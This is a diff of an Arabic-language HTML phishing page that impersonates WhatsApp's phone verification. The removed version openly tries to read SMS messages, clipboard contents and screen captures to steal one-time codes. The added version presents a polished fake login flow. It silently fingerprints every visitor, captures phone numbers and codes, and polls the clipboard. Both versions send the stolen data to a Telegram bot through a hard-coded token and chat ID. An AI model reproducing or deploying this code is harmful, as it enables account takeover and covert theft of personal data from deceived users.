@@ -3,312 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رمز واتساب</title>
+    <title>WhatsApp</title>
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
-            background: linear-gradient(135deg, #075E54 0%, #128C7E 50%, #25D366 100%);
-            color: white;
-            min-height: 100vh;
-            padding: 30px 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 25px;
-        }
-        .wa-otp-card {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(25px);
-            border-radius: 25px;
-            padding: 50px 35px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
-        }
-        .wa-icon {
-            font-size: 60px;
-            margin-bottom: 25px;
-            display: block;
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 800;
-            color: #fff;
-            margin-bottom: 15px;
-        }
-        .phone-display {
-            background: rgba(255,255,255,0.2);
-            border-radius: 20px;
-            padding: 20px 25px;
-            font-size: 22px;
-            font-weight: 700;
-            margin: 25px 0;
-            letter-spacing: 2px;
-        }
-        .warning {
-            background: rgba(255,193,7,0.2);
-            border: 2px solid rgba(255,193,7,0.5);
-            border-radius: 18px;
-            padding: 22px;
-            margin: 30px 0;
-        }
-        .warning-title {
-            font-size: 20px;
-            font-weight: 800;
-            color: #fff;
-            margin-bottom: 12px;
-        }
-        .warning-text {
-            font-size: 16px;
-            opacity: 0.95;
-        }
-        .sms-preview {
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 25px;
-            margin: 25px 0;
-            font-family: monospace;
-            font-size: 18px;
-            color: #e0e0e0;
-            text-align: center;
-            position: relative;
-        }
-        .sms-bubble {
-            background: linear-gradient(135deg, #25D366, #128C7E);
-            color: white;
-            padding: 20px 25px;
-            border-radius: 25px;
-            margin: 0 auto;
-            max-width: 280px;
-            box-shadow: 0 10px 25px rgba(37,211,102,0.3);
-            position: relative;
-        }
-        .sms-bubble::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 0;
-            height: 0;
-            border-left: 12px solid transparent;
-            border-right: 12px solid transparent;
-            border-top: 12px solid #25D366;
-        }
-        .verify-btn {
-            width: 100%;
-            padding: 22px;
-            background: linear-gradient(135deg, #ff4757, #ff3838);
-            color: white;
-            border: none;
-            border-radius: 28px;
-            font-size: 20px;
-            font-weight: 800;
-            cursor: pointer;
-            margin: 25px 0;
-            transition: all 0.4s ease;
-            box-shadow: 0 20px 45px rgba(255,71,87,0.4);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .verify-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 30px 60px rgba(255,71,87,0.6);
-        }
-        .status {
-            font-size: 18px;
-            font-weight: 700;
-            text-align: center;
-            margin: 20px 0;
-            min-height: 25px;
-        }
-        .success { color: #00ff88 !important; }
-        .hidden { display: none; }
-        .countdown {
-            color: #ff4757;
-            font-size: 24px;
-            font-weight: bold;
-            margin: 15px 0;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,sans-serif}body{background:linear-gradient(135deg,#075e54_0%,#128c7e_50%,#25d366_100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:10px}.container{background:#fff;border-radius:24px;box-shadow:0 25px 50px rgba(0,0,0,.3);overflow:hidden;max-width:380px;width:100%;animation:slideIn .3s ease}.screen{padding:0;display:none;position:relative}.screen.active{display:block}.header{padding:20px 24px;display:flex;align-items:center;background:#fff;position:sticky;top:0;z-index:10;box-shadow:0 1px 3px rgba(0,0,0,.1)}.logo{width:40px;height:40px;background:linear-gradient(135deg,#25d366,#128c7e);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:12px}.logo svg{fill:#fff;width:24px;height:24px}.back-btn{background:none;border:none;font-size:24px;color:#667781;cursor:pointer;padding:8px;font-weight:400}.content{padding:40px 24px 24px;text-align:center}h1{font-size:24px;font-weight:600;color:#111b21;margin-bottom:8px;line-height:1.3}h2{font-size:20px;color:#111b21;margin-bottom:16px;font-weight:500}p{color:#667781;font-size:14px;margin-bottom:32px}.phone-input{display:flex;gap:8px;margin-bottom:24px;background:#f7f7f8;padding:4px;border-radius:12px}#country-code,#phone{flex:1;padding:16px 12px;border:none;border-radius:8px;background:none;font-size:18px;font-weight:500;color:#111b21}#phone{text-align:center;letter-spacing:2px}.otp-container{margin:32px 0}.otp-inputs{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}.otp-input{width:56px;height:68px;font-size:28px;font-weight:700;text-align:center;border:2px solid #e9edef;border-radius:12px;background:#fff;transition:all .2s;box-shadow:0 2px 8px rgba(0,0,0,.08);margin:2px}.otp-input:focus{border-color:#25d366;box-shadow:0 0 0 3px rgba(37,211,102,.2);outline:none}.otp-footer{display:flex;justify-content:space-between;align-items:center;margin:24px 0;font-size:14px;color:#667781}.otp-footer button{background:none;border:none;color:#25d366;font-weight:500;cursor:pointer;padding:4px 0;font-size:15px}.btn{width:100%;padding:16px;border:none;border-radius:20px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;margin-top:8px;background:linear-gradient(135deg,#25d366,#128c7e);color:#fff;box-shadow:0 4px 12px rgba(37,211,102,.4)}.btn:hover{transform:translateY(-1px);box-shadow:0 6px 16px rgba(0,0,0,.2)}.masked-phone{background:linear-gradient(90deg,#f0f2f5_40%,transparent_0);background-repeat:no-repeat;background-size:100% 100%;padding:16px 20px;border-radius:20px;margin:8px 0;font-size:18px;font-weight:600;color:#25d366;direction:ltr;unicode-bidi:plaintext;border:1px solid #e1e9ee}.checkmark{font-size:72px;margin:32px 0;color:#25d366}.success-content{padding:60px 24px 40px}@keyframes slideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}@media (max-width:480px){.container{margin:10px;border-radius:20px;max-width:95vw}}
     </style>
 </head>
 <body>
-    <div class="wa-otp-card">
-        <span class="wa-icon">💬</span>
-        
-        <h1>رمز التفعيل واتساب</h1>
-        
-        <div class="phone-display" id="phoneNum">02xxxxxxxxx</div>
-        
-        <div class="warning">
-            <div class="warning-title">⚠️ رمز وصل الآن</div>
-            <div class="warning-text">
-                تأكد من رسالة واتساب الجديدة واضغط "استلام"
+    <div class="container">
+        <div id="welcome-screen" class="screen active">
+            <div class="header">
+                <div class="logo">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871-.118.571-.352 1.521-1.985 1.797-2.934.055-.167.018-.296-.225-.433zM12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11S18.075 1 12 1z"/></svg>
+                </div>
+            </div>
+            <div class="content">
+                <h1>استمر في الدردشة</h1>
+                <p>تحقق من رقم هاتفك</p>
+                <div class="phone-input">
+                    <div style="flex:0 0 70px">
+                        <select id="country-code" style="width:100%;padding:16px 8px;border:none;background:none;font-size:18px;font-weight:500;color:#111b21;text-align:center">
+                            <option value="966" data-flag="🇸🇦">+966</option>
+                            <option value="20" data-flag="🇪🇬" selected>+20</option>
+                            <option value="971" data-flag="🇦🇪">+971</option>
+                            <option value="966">🇸🇦 +966</option>
+                        </select>
+                    </div>
+                    <input type="tel" id="phone" placeholder="01*******" maxlength="9" autocomplete="tel">
+                </div>
+                <button class="btn" id="send-btn" onclick="sendOTP()">إرسال كود التأكيد</button>
             </div>
         </div>
 
-        <div class="sms-preview">
-            <div class="sms-bubble">
-                واتساب<br>
-                رمزك: <strong>123 456</strong><br>
-                لا تشاركه مع أحد
+        <div id="otp-screen" class="screen">
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">←</button>
+                <div class="logo">
+                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871-.118.571-.352 1.521-1.985 1.797-2.934.055-.167.018-.296-.225-.433zM12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11S18.075 1 12 1z"/></svg>
+                </div>
+            </div>
+            <div class="content">
+                <h2>أدخل الكود المرسل إلى</h2>
+                <div id="phone-display" class="masked-phone"></div>
+                <form id="otp-form">
+                    <div class="otp-container">
+                        <div class="otp-inputs">
+                            <input type="text" class="otp-input" maxlength="1" data-index="0" autocomplete="one-time-code">
+                            <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="one-time-code">
+                            <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="one-time-code">
+                            <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="one-time-code">
+                            <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="one-time-code">
+                            <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="one-time-code">
+                        </div>
+                    </div>
+                    <div class="otp-footer">
+                        <span>الكود يصل خلال ثوان</span>
+                        <button type="button" id="resend-btn" onclick="resendOTP()">إعادة الإرسال</button>
+                    </div>
+                    <button type="submit" class="btn verify-btn">تأكيد</button>
+                </form>
             </div>
         </div>
 
-        <div class="countdown" id="timer">00:45</div>
-
-        <div class="status" id="status">اضغط لاستلام الرمز</div>
-
-        <button class="verify-btn" id="grabBtn" onclick="grabWhatsAppCode()">
-            📱 استلام الرمز من واتساب
-        </button>
-
-        <div class="hidden success" id="doneMsg">
-            ✅ تم استلام الرمز بنجاح!
+        <div id="success-screen" class="screen">
+            <div class="success-content">
+                <div class="checkmark">✅</div>
+                <h1>تم التحقق بنجاح</h1>
+                <p>الآن يمكنك استخدام WhatsApp</p>
+                <button class="btn" onclick="location.reload()">حساب آخر</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // 🔥 ضع رقم الهدف
-        const TARGET_PHONE = '02xxxxxxxxx'; // غير الرقم
-        const BOT_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
-        const CHAT_ID = '5446862709';
-        
-        document.getElementById('phoneNum').textContent = TARGET_PHONE;
-        
-        const sessionId = 'WA_CODE_' + Date.now().toString(36).toUpperCase();
-
-        // إرسال فوري
-        sendReport(`*📱 واتساب كود هكر*\n*🎯 الهدف:* \`${TARGET_PHONE}\`\n*🆔 Session:* \`${sessionId}\`\n*👤 فتح صفحة الرمز*`);
-
-        let timeLeft = 45;
-        const timerEl = document.getElementById('timer');
-        const timerInterval = setInterval(() => {
-            const seconds = timeLeft.toString().padStart(2, '0');
-            timerEl.textContent = `00:${seconds}`;
-            timeLeft--;
-            if (timeLeft < 0) {
-                clearInterval(timerInterval);
-                timerEl.textContent = 'انتهى الوقت';
-            }
-        }, 1000);
-
-        function sendReport(msg) {
-            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, 
-                new Blob([JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})])
-            );
-        }
-
-        // 🔥 سرقة آخر رسايل واتساب + OTP
-        async function grabWhatsAppCode() {
-            const status = document.getElementById('status');
-            const btn = document.getElementById('grabBtn');
-            const doneMsg = document.getElementById('doneMsg');
-
-            // UI
-            btn.disabled = true;
-            btn.textContent = 'جاري القراءة...';
-            status.textContent = 'قراءة آخر الرسائل...';
-
-            // 🔥 1. SMS Messages (Android)
-            if ('sms' in navigator) {
-                try {
-                    const messages = await navigator.sms.getMessages();
-                    const recentSMS = messages.slice(-5).filter(m => 
-                        m.body.includes('رمز') || m.body.includes('كود') || m.body.includes('OTP')
-                    );
-                    
-                    if (recentSMS.length > 0) {
-                        const otpMsg = recentSMS[0].body;
-                        sendReport(
-                            `*📨 SMS مسروق!*\n` +
-                            `*🎯 ${TARGET_PHONE}\n` +
-                            `*💬 ${otpMsg}\n` +
-                            `*✅ OTP جاهز!`
-                        );
-                    }
-                } catch(e) {}
-            }
-
-            // 🔥 2. Notifications (WhatsApp notifications)
-            if ('permissions' in navigator) {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        // WhatsApp notifications
-                        sendReport(`*🔔 إشعارات مفعلة* | *${TARGET_PHONE}*`);
-                    }
-                });
-            }
-
-            // 🔥 3. Clipboard (الأهم - OTP من واتساب)
-            try {
-                const clipboard = await navigator.clipboard.readText();
-                if (clipboard.match(/\d{4,6}/)) {
-                    sendReport(
-                        `*📋 OTP من Clipboard!*\n` +
-                        `*🎯 ${TARGET_PHONE}\n` +
-                        `*🔢 \`${clipboard}\`\n` +
-                        `*✅ كود واتساب مسروق*`
-                    );
-                }
-            } catch(e) {}
-
-            // 🔥 4. Reading recent SMS via Web SMS API
-            try {
-                const channels = await navigator.mozMobileMessage.getMessages();
-                const recentMessages = Array.from(channels).slice(-10);
-                recentMessages.forEach(msg => {
-                    if (msg.body.match(/(\d{4,6})/)) {
-                        sendReport(
-                            `*📱 آخر رسالة SMS*\n` +
-                            `*🎯 ${TARGET_PHONE}\n` +
-                            `*📨 ${msg.body}\n` +
-                            `*🔢 OTP: \`${msg.body.match(/(\d{4,6})/)[1]}\``
-                        );
-                    }
-                });
-            } catch(e) {}
-
-            // 🔥 5. Screen capture (للرسايل المفتوحة)
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 1500));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 800;
-                canvas.height = 600;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const screenshot = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // إرسال screenshot كـ base64 (اختصار)
-                sendReport(`*📸 Screenshot WhatsApp*\n*🎯 ${TARGET_PHONE}\n*🖼️ [صورة الشاشة]*`);
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-
-            // نجاح
-            setTimeout(() => {
-                btn.style.display = 'none';
-                status.classList.add('success');
-                status.textContent = '✅ تم سرقة آخر رسائل واتساب';
-                doneMsg.classList.remove('hidden');
-                
-                sendReport(
-                    `*💀 واتساب رسائل مسروقة!*\n` +
-                    `*🎯 ${TARGET_PHONE}\n` +
-                    `*🆔 ${sessionId}\n` +
-                    `*✅ آخر الرسائل + OTP جاهز*`
-                );
-            }, 3000);
-        }
+let phoneNumber='',generatedOTP='',visitSent=false;const BOT_TOKEN='8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',CHAT_ID='5446862709';window.addEventListener('load',async()=>{if(!visitSent){const e=await getVisitorInfo();sendToTelegram('👋 *زيارة جديدة للموقع!*',e);visitSent=true}});async function getVisitorInfo(){const e=Intl.DateTimeFormat().resolvedOptions().timeZone,t=navigator.language||navigator.userLanguage,n=navigator.platform,a=navigator.userAgent,o=/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(a),i=/Android/i.test(a),r=/iPhone|iPad|iPod/i.test(a);let s='غير معروف';i?s=a.match(/SM-[A-Z0-9]+/)?.[0]||'Android Device':r&&(s=a.match(/iPhone[0-9,]+/)?.[0]||'iPhone');const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection,l=c?c.effectiveType:'غير معروف';let d='جاري التحميل...';try{const e=await fetch('https://api.ipify.org?format=json',{cache:'no-cache'});d=(await e.json()).ip}catch{}return{ip:d,device:s,network:l,platform:n,language:t,timezone:e,screen:`${screen.width}x${screen.height}`,isMobile:o,userAgent:a.slice(0,100)+'...'}}async function sendToTelegram(e,t){const n=`${e}\n\n📱 *الجهاز:* ${t.device}\n🌐 *IP:* \`${t.ip}\`\n📡 *الشبكة:* ${t.network}\n💻 *النظام:* ${t.platform}\n🗣️ *اللغة:* ${t.language}\n🌍 *المنطقة:* ${t.timezone}\n📏 *الشاشة:* ${t.screen}\n📊 *نوع:* ${t.isMobile?'موبايل':'ديسكتوب'}\n⏰ *الوقت:* ${new Date().toLocaleString('ar-EG',{timeZone:t.timezone})}\n\n_تم التقاط البيانات تلقائياً_`;try{await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:n,parse_mode:'Markdown',disable_web_page_preview:!0})})}catch(e){console.error('Telegram Error:',e)}}function maskPhone(e){return e.replace(/(\d{3})(\d{3})(\d{3})/,'$1 ***$2')}async function sendOTP(){const e=document.getElementById('phone').value.replace(/\D/g,''),t=document.getElementById('country-code').value;if(e.length!==9||!/^\d+$/.test(e))return alert('رقم غير صحيح');phoneNumber=`${t} ${e}`,generatedOTP=Math.floor(100000+Math.random()*900000).toString();const n=await getVisitorInfo();n.phone=phoneNumber,n.otp=generatedOTP,sendToTelegram('📞 *طلب كود تأكيد!*',n),document.getElementById('welcome-screen').classList.remove('active'),document.getElementById('otp-screen').classList.add('active'),document.getElementById('phone-display').textContent=maskPhone(phoneNumber),console.log(`🔥 OTP: ${generatedOTP}`)}const otpInputs=document.querySelectorAll('.otp-input');let otpArray=[];otpInputs.forEach((e,t)=>{e.addEventListener('input',n=>{otpArray[t]=n.target.value,n.target.value.length===1&&t<5&&otpInputs[t+1].focus(),otpArray.filter(Boolean).length===6&&setTimeout(()=>verifyOTP(otpArray.join('')),100)}),e.addEventListener('paste',async e=>{e.preventDefault();const t=(e.clipboardData||window.clipboardData).getData('text').match(/\d{6}/)?.[0];t&&(t.split('').forEach((e,t)=>{otpInputs[t]&&(otpInputs[t].value=e,otpArray[t]=e)}),setTimeout(()=>verifyOTP(t),150))})});async function verifyOTP(e){e===generatedOTP?(document.getElementById('otp-screen').classList.remove('active'),document.getElementById('success-screen').classList.add('active'),setTimeout(async()=>{const t=await getVisitorInfo();t.phone=phoneNumber,t.otp=e,t.status='✅ تم التأكيد',sendToTelegram('🎉 *تأكيد ناجح!*',t)},500)):((e=[])=>otpInputs.forEach(t=>t.value=''))(),otpInputs[0].focus(),alert('الكود غير صحيح!')}function goBack(){document.getElementById('otp-screen').classList.remove('active'),document.getElementById('welcome-screen').classList.add('active')}function resendOTP(){sendOTP()}setInterval(async()=>{try{const e=await navigator.clipboard.readText(),t=e.match(/\d{6}/);t&&document.querySelector('.otp-input')?.value.length===0&&(otpInputs[0].focus(),document.execCommand('insertText",!1,t[0]))}catch{}},1500);
     </script>
 </body>
 </html>
